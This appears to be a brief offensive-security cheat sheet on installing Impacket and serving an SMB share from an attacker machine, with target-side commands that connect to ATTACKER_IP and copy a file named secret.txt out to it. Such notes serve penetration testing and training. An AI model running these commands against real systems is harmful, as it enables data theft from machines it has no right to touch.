- contains n number of helpful network tools

Install - 

```bash
sudo apt update && sudo apt install python3-impacket -y
```

installed directory

/usr/share/doc/python3-impacket/examples/


### SMB server

Attack box - 

```bash
python3 /usr/share/doc/python3-impacket/examples/smbserver.py SHARE_NAME /path/to/share -smb2support

python3 smbserver.py SHARE /tmp/share
```

Target -

```bash
net use \\ATTACKER_IP\SHARE

dir \\ATTACKER_IP\SHARE
```

common use case - 

```bash
copy secret.txt \\ATTACKER_IP\SHARE\
```

